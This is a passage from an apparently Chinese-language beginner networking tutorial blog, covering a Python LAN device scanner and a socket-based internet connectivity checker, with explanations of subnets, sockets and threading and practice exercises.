class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   - 这是一个局域网（LAN）&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   - 使用星型拓扑结构&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   - 共有 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(active_hosts)&#125;</span> 台设备连接到同一个交换机/路由器&quot;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n⚠️  未发现其他活跃设备&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="运行程序">运行程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> code/day02<br>python day02_lan_scanner.py<br></code></pre></td></tr></table></figure><h3 id="预期输出">预期输出</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">======================================================================<br>                         局域网设备扫描器<br>======================================================================<br><br>📍 本机IP: 192.168.1.100<br>🌐 所在子网: 192.168.1.0/24<br><br>🔍 开始扫描子网: 192.168.1.0/24<br>📊 总共需要扫描 254 个IP地址<br>⏳ 请稍候...<br><br>✅ 发现设备: 192.168.1.1     | router.home                     | 端口: 80<br>✅ 发现设备: 192.168.1.100   | linzhibin-MacBook              | 端口: 80<br>✅ 发现设备: 192.168.1.105   | xiaomi-phone                   | 端口: 443<br><br>======================================================================<br>✨ 扫描完成！共发现 3 台活跃设备<br>======================================================================<br><br>📋 活跃设备列表：<br><span class="hljs-section">IP地址           | 主机名                          | 开放端口</span><br><span class="hljs-section">----------------------------------------------------------------------</span><br>192.168.1.1     | router.home                    | 80<br>192.168.1.100   | linzhibin-MacBook              | 80 ⭐<br>192.168.1.105   | xiaomi-phone                   | 443<br><br>======================================================================<br>                    网络拓扑结构（星型拓扑）<br>======================================================================<br><br><span class="hljs-code">                      [路由器/交换机]</span><br><span class="hljs-code">                             |</span><br><span class="hljs-code">          ----------------------------------------</span><br><span class="hljs-code">          |-- [192.168.1.1] router.home</span><br><span class="hljs-code">          |-- [192.168.1.100] linzhibin-MacBook (本机)</span><br><span class="hljs-code">          |-- [192.168.1.105] xiaomi-phone</span><br><br>======================================================================<br><br>💡 网络分析：<br>   - 这是一个局域网（LAN）<br>   - 使用星型拓扑结构<br>   - 共有 3 台设备连接到同一个交换机/路由器<br></code></pre></td></tr></table></figure><h2 id="🔍-代码详解">🔍 代码详解</h2><h3 id="1-ipaddress模块">1. ipaddress模块</h3><p>Python的<code>ipaddress</code>模块用于处理IP地址和网络：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ipaddress<br><br><span class="hljs-comment"># 创建网络对象</span><br>network = ipaddress.ip_network(<span class="hljs-string">&quot;192.168.1.0/24&quot;</span>)<br><br><span class="hljs-comment"># 获取网络中的所有主机IP</span><br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> network.hosts():<br>    <span class="hljs-built_in">print</span>(ip)  <span class="hljs-comment"># 192.168.1.1, 192.168.1.2, ..., 192.168.1.254</span><br></code></pre></td></tr></table></figure><h3 id="2-子网掩码-24-是什么意思？">2. 子网掩码 /24 是什么意思？</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> 的含义：<br><br>/<span class="hljs-number">24</span> 表示子网掩码有<span class="hljs-number">24</span>个<span class="hljs-number">1</span>：<br><span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">00000000</span><br>即：<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span><br><br>可用IP范围：<br><span class="hljs-number">192.168.1.1</span> 到 <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">254</span>（共<span class="hljs-number">254</span>个）<br><span class="hljs-number">192.168.1.0</span> 是网络地址<br><span class="hljs-number">192.168.1.255</span> 是广播地址<br></code></pre></td></tr></table></figure><h3 id="3-ThreadPoolExecutor-并发扫描">3. ThreadPoolExecutor 并发扫描</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><span class="hljs-comment"># 创建线程池，最多50个线程同时工作</span><br><span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">50</span>) <span class="hljs-keyword">as</span> executor:<br>    <span class="hljs-comment"># 提交任务</span><br>    futures = [executor.submit(scan_ip, ip) <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> ip_list]<br><br>    <span class="hljs-comment"># 等待完成</span><br>    <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> as_completed(futures):<br>        result = future.result()<br></code></pre></td></tr></table></figure><p><strong>为什么要用多线程？</strong></p><ul><li>单线程扫描254个IP需要很长时间</li><li>多线程可以同时扫描多个IP，大大提高效率</li><li>50个线程可以让扫描速度提升几十倍</li></ul><h3 id="4-connect-ex方法">4. connect_ex方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">result = sock.connect_ex((ip, port))<br><br><span class="hljs-comment"># 返回值：</span><br><span class="hljs-comment"># 0 = 连接成功</span><br><span class="hljs-comment"># 其他 = 连接失败（错误码）</span><br></code></pre></td></tr></table></figure><p>这比普通的<code>connect()</code>方法更好，因为失败时不会抛出异常。</p><h2 id="🎓-知识小结">🎓 知识小结</h2><h3 id="今天学到了什么？">今天学到了什么？</h3><ol><li>✅ 网络按范围分为LAN、MAN、WAN</li><li>✅ 家庭和办公室网络是局域网（LAN）</li><li>✅ 网络拓扑结构有5种：总线、星型、环型、网状、树型</li><li>✅ 现代网络最常用星型拓扑结构</li><li>✅ 子网的概念和表示方法</li><li>✅ 如何扫描局域网内的设备</li></ol><h3 id="重要概念">重要概念</h3><table><thead><tr><th>概念</th><th>解释</th><th>例子</th></tr></thead><tbody><tr><td>局域网</td><td>小范围的网络</td><td>家庭WiFi</td></tr><tr><td>星型拓扑</td><td>所有设备连接到中心节点</td><td>所有电脑连接到路由器</td></tr><tr><td>子网</td><td>一个网络的子集</td><td>192.168.1.0/24</td></tr><tr><td>主机</td><td>网络中的设备</td><td>你的电脑、手机</td></tr></tbody></table><h2 id="💪-练习题">💪 练习题</h2><h3 id="练习1：识别拓扑类型">练习1：识别拓扑类型</h3><p>说出以下场景使用的是什么拓扑结构：</p><ol><li>所有教室的电脑都连接到机房的交换机</li><li>地铁13号线各个站点的连接</li><li>互联网骨干网的连接方式</li></ol><h3 id="练习2：修改扫描器">练习2：修改扫描器</h3><p>修改程序，让它可以：</p><ol><li>扫描自定义的子网（不是默认的/24）</li><li>显示每个设备的响应时间</li><li>保存扫描结果到文件</li></ol><h3 id="练习3：计算题">练习3：计算题</h3><p>一个192.168.1.0/24的网络：</p><ol><li>子网掩码是多少？</li><li>第一个可用IP是多少？</li><li>最后一个可用IP是多少？</li><li>总共有多少个可用IP？</li></ol><h3 id="练习4：绘制拓扑图">练习4：绘制拓扑图</h3><p>绘制你家里或公司的网络拓扑结构图，标注：</p><ul><li>所有设备（电脑、手机、打印机等）</li><li>路由器/交换机</li><li>连接方式（有线/无线）</li></ul><h2 id="📚-扩展阅读">📚 扩展阅读</h2><h3 id="为什么星型拓扑最流行？">为什么星型拓扑最流行？</h3><p><strong>历史原因</strong>：</p><ul><li>早期使用总线型拓扑（10BASE-2同轴电缆）</li><li>问题：一根线断了，所有设备都不能用</li><li>星型拓扑解决了这个问题</li></ul><p><strong>现代优势</strong>：</p><ul><li>便于管理：可以在交换机上管理每个端口</li><li>易于排错：某个设备故障不影响其他设备</li><li>易于扩展：只需在交换机上增加端口</li><li>性能好：交换机可以智能转发数据</li></ul><h3 id="家庭网络的实际拓扑">家庭网络的实际拓扑</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs 1c">互联网<br>  <span class="hljs-string">|</span><br>光猫<br>  <span class="hljs-string">|</span><br>路由器（WiFi）<br>  <span class="hljs-string">|</span><br>  <span class="hljs-string">|---- 电脑（有线）</span><br>  <span class="hljs-string">|---- 手机（无线）</span><br>  <span class="hljs-string">|---- 平板（无线）</span><br>  <span class="hljs-string">|---- 智能电视（有线）</span><br>  <span class="hljs-string">|---- 智能音箱（无线）</span><br></code></pre></td></tr></table></figure><p>这是一个典型的<strong>星型拓扑</strong>！</p><h3 id="企业网络的拓扑">企业网络的拓扑</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">     核心交换机（根）<br>       /      <span class="hljs-string">\</span><br>  交换机A    交换机B<br>  /   <span class="hljs-string">\</span>       /   <span class="hljs-string">\</span><br>电脑<span class="hljs-number">1</span> 电脑<span class="hljs-number">2</span> 电脑<span class="hljs-number">3</span> 电脑<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>这是一个<strong>树型拓扑</strong>（也叫分层星型拓扑）！</p><h2 id="🎯-明天预告">🎯 明天预告</h2><p><strong>第3天：OSI七层模型</strong></p><p>我们将学习：</p><ul><li>什么是OSI七层模型？</li><li>每一层做什么？</li><li>为什么要分层？</li><li>编写程序分析各层的作用</li></ul><hr><p>💡 <strong>今日金句</strong>：网络拓扑就像城市规划，不同的结构有不同的优缺点！</p><p>👉 <a href="day01.md">上一天：认识计算机网络</a> | <a href="../../README.md">返回目录</a> | <a href="day03.md">下一天：OSI七层模型</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1天：认识计算机网络</title>
    <link href="/2025/11/10/1%E5%A4%A9%EF%BC%9A%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <url>/2025/11/10/1%E5%A4%A9%EF%BC%9A%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h1>第1天：认识计算机网络</h1><blockquote><p>“互联网就像一张巨大的蜘蛛网，连接着全世界的计算机。”</p></blockquote><h2 id="📚-今日目标">📚 今日目标</h2><ul><li>理解什么是计算机网络</li><li>了解网络的作用和重要性</li><li>编写第一个网络程序：检测网络连接</li></ul><h2 id="🎯-什么是计算机网络？">🎯 什么是计算机网络？</h2><h3 id="生活化理解">生活化理解</h3><p>想象一下你在用微信聊天：</p><ol><li>你在北京发了一条消息</li><li>你的朋友在上海收到了这条消息</li><li>中间发生了什么？</li></ol><p>这就是计算机网络在工作！</p><p><strong>计算机网络</strong>就是把分散在不同地点的计算机通过通信线路连接起来，实现资源共享和信息传递的系统。</p><h3 id="网络的三个关键要素">网络的三个关键要素</h3><ol><li><strong>计算机</strong>（节点）：发送和接收信息的设备</li><li><strong>通信线路</strong>（链路）：传输信息的介质（网线、WiFi、光纤等）</li><li><strong>协议</strong>（规则）：计算机之间交流的&quot;语言&quot;</li></ol><h3 id="类比理解">类比理解</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">计算机网络 <span class="hljs-operator">=</span> 快递系统<br><br>你的电脑  →  寄件人<br>网络线路  →  快递车、飞机<br>路由器    →  中转站<br>协议      →  包裹规格、运输规则<br>目标电脑  →  收件人<br></code></pre></td></tr></table></figure><h2 id="💡-网络能做什么？">💡 网络能做什么？</h2><h3 id="1-资源共享">1. 资源共享</h3><ul><li>共享打印机</li><li>共享文件</li><li>共享数据库</li></ul><h3 id="2-信息传递">2. 信息传递</h3><ul><li>发送邮件</li><li>网页浏览</li><li>视频通话</li><li>在线游戏</li></ul><h3 id="3-分布式计算">3. 分布式计算</h3><ul><li>云计算</li><li>区块链</li><li>大数据处理</li></ul><h2 id="🔧-实战项目：检测网络连接">🔧 实战项目：检测网络连接</h2><p>让我们编写第一个网络程序！这个程序会检测你的电脑是否连接到互联网。</p><h3 id="代码实现">代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day01_network_checker.py</span><br><span class="hljs-comment"># 功能：检测网络连接状态</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_internet_connection</span>(<span class="hljs-params">host=<span class="hljs-string">&quot;8.8.8.8&quot;</span>, port=<span class="hljs-number">53</span>, timeout=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    检测是否能连接到互联网</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数说明：</span><br><span class="hljs-string">        host: 目标主机IP地址（默认使用Google的DNS服务器 8.8.8.8）</span><br><span class="hljs-string">        port: 目标端口（53是DNS服务的标准端口）</span><br><span class="hljs-string">        timeout: 超时时间（秒）</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回值：</span><br><span class="hljs-string">        True: 网络连接正常</span><br><span class="hljs-string">        False: 网络连接失败</span><br><span class="hljs-string"></span><br><span class="hljs-string">    工作原理：</span><br><span class="hljs-string">        尝试创建一个socket连接到指定的服务器</span><br><span class="hljs-string">        如果能连接成功，说明网络是通的</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 创建一个socket对象</span><br>        <span class="hljs-comment"># AF_INET表示IPv4地址</span><br>        <span class="hljs-comment"># SOCK_STREAM表示TCP协议</span><br>        socket.setdefaulttimeout(timeout)<br>        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br>        <span class="hljs-comment"># 尝试连接到目标主机的指定端口</span><br>        sock.connect((host, port))<br><br>        <span class="hljs-comment"># 连接成功，关闭socket</span><br>        sock.close()<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-comment"># 连接失败，说明网络不通</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;连接失败：<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_local_ip</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取本机的IP地址</span><br><span class="hljs-string"></span><br><span class="hljs-string">    工作原理：</span><br><span class="hljs-string">        创建一个UDP socket，连接到外部地址（不会真正发送数据）</span><br><span class="hljs-string">        通过这个socket获取本机的IP地址</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 创建UDP socket</span><br>        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br><br>        <span class="hljs-comment"># 连接到一个外部地址（这里不会真正发送数据）</span><br>        <span class="hljs-comment"># 使用Google的DNS服务器地址</span><br>        sock.connect((<span class="hljs-string">&quot;8.8.8.8&quot;</span>, <span class="hljs-number">80</span>))<br><br>        <span class="hljs-comment"># 获取本机的IP地址</span><br>        local_ip = sock.getsockname()[<span class="hljs-number">0</span>]<br><br>        sock.close()<br>        <span class="hljs-keyword">return</span> local_ip<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;无法获取IP地址&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_hostname</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取计算机的主机名</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> socket.gethostname()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;未知主机名&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    主函数：执行网络检测并显示结果</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;网络连接检测工具&quot;</span>.center(<span class="hljs-number">50</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># 获取主机名</span><br>    hostname = get_hostname()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📌 主机名: <span class="hljs-subst">&#123;hostname&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># 获取本机IP地址</span><br>    local_ip = get_local_ip()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📍 本机IP地址: <span class="hljs-subst">&#123;local_ip&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># 检测网络连接</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;🔍 正在检测网络连接...&quot;</span>)<br><br>    <span class="hljs-comment"># 测试多个服务器</span><br>    test_servers = [<br>        (<span class="hljs-string">&quot;8.8.8.8&quot;</span>, <span class="hljs-string">&quot;Google DNS&quot;</span>),<br>        (<span class="hljs-string">&quot;114.114.114.114&quot;</span>, <span class="hljs-string">&quot;国内DNS&quot;</span>),<br>        (<span class="hljs-string">&quot;1.1.1.1&quot;</span>, <span class="hljs-string">&quot;Cloudflare DNS&quot;</span>)<br>    ]<br><br>    connected = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> ip, name <span class="hljs-keyword">in</span> test_servers:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   测试连接到 <span class="hljs-subst">&#123;name&#125;</span> (<span class="hljs-subst">&#123;ip&#125;</span>)...&quot;</span>, end=<span class="hljs-string">&quot; &quot;</span>)<br>        <span class="hljs-keyword">if</span> check_internet_connection(ip):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;✅ 成功&quot;</span>)<br>            connected = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ 失败&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>()<br>    <span class="hljs-keyword">if</span> connected:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;🎉 网络连接正常！&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;💡 这意味着你的电脑可以访问互联网上的其他计算机。&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;⚠️  网络连接异常！&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;💡 请检查：&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   1. 网线是否插好？&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   2. WiFi是否连接？&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   3. 路由器是否正常工作？&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">50</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="运行程序">运行程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> code/day01<br>python day01_network_checker.py<br></code></pre></td></tr></table></figure><h3 id="预期输出">预期输出</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">==================================================<br>                网络连接检测工具<br>==================================================<br><br>📌 主机名: linzhibin-MacBook<br>📍 本机IP地址: 192.168.1.100<br><br>🔍 正在检测网络连接...<br><span class="hljs-code">   测试连接到 Google DNS (8.8.8.8)... ✅ 成功</span><br><span class="hljs-code">   测试连接到 国内DNS (114.114.114.114)... ✅ 成功</span><br><span class="hljs-code">   测试连接到 Cloudflare DNS (1.1.1.1)... ✅ 成功</span><br><br>🎉 网络连接正常！<br>💡 这意味着你的电脑可以访问互联网上的其他计算机。<br><br>==================================================<br></code></pre></td></tr></table></figure><h2 id="🔍-代码详解">🔍 代码详解</h2><h3 id="Socket是什么？">Socket是什么？</h3><p><strong>Socket</strong>（套接字）是网络编程的基础，可以理解为：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">Socket</span> <span class="hljs-operator">=</span> 电话机<br><br>建立连接   →  拨号<br>发送数据   →  说话<br>接收数据   →  听对方说话<br>关闭连接   →  挂断电话<br></code></pre></td></tr></table></figure><h3 id="为什么用8-8-8-8？">为什么用8.8.8.8？</h3><ul><li><code>8.8.8.8</code> 是Google提供的公共DNS服务器</li><li>它几乎24小时在线，非常稳定</li><li>如果能连接到它，说明网络是通的</li></ul><h3 id="AF-INET-和-SOCK-STREAM-是什么？">AF_INET 和 SOCK_STREAM 是什么？</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">socket.AF_INET       <span class="hljs-comment"># 使用IPv4地址</span><br>socket.AF_INET6      <span class="hljs-comment"># 使用IPv6地址</span><br><br>socket.SOCK_STREAM   <span class="hljs-comment"># TCP协议（可靠传输）</span><br>socket.SOCK_DGRAM    <span class="hljs-comment"># UDP协议（快速传输）</span><br></code></pre></td></tr></table></figure><h2 id="🎓-知识小结">🎓 知识小结</h2><h3 id="今天学到了什么？">今天学到了什么？</h3><ol><li>✅ 计算机网络是连接多台计算机的系统</li><li>✅ 网络由计算机、通信线路和协议组成</li><li>✅ Socket是网络编程的基础工具</li><li>✅ 可以通过连接DNS服务器来检测网络状态</li></ol><h3 id="重要概念">重要概念</h3><table><thead><tr><th>概念</th><th>解释</th><th>比喻</th></tr></thead><tbody><tr><td>计算机网络</td><td>多台计算机互联的系统</td><td>快递网络</td></tr><tr><td>Socket</td><td>网络编程接口</td><td>电话机</td></tr><tr><td>IP地址</td><td>计算机在网络中的地址</td><td>家庭住址</td></tr><tr><td>端口</td><td>应用程序的标识号</td><td>门牌号</td></tr></tbody></table><h2 id="💪-练习题">💪 练习题</h2><h3 id="练习1：修改代码">练习1：修改代码</h3><p>修改程序，让它可以检测连接到百度服务器（220.181.38.148）</p><h3 id="练习2：思考题">练习2：思考题</h3><ol><li>为什么我们使用DNS服务器（端口53）而不是HTTP服务器（端口80）来测试？</li><li>本机IP地址和互联网IP地址有什么区别？</li></ol><h3 id="练习3：扩展功能">练习3：扩展功能</h3><p>尝试添加功能：显示连接到目标服务器所需的时间（提示：使用time模块）</p><h2 id="📚-扩展阅读">📚 扩展阅读</h2><ul><li>IP地址是什么？（明天会详细讲解）</li><li>DNS是什么？（第15天会详细讲解）</li><li>TCP和UDP有什么区别？（第36天会详细讲解）</li></ul><h2 id="🎯-明天预告">🎯 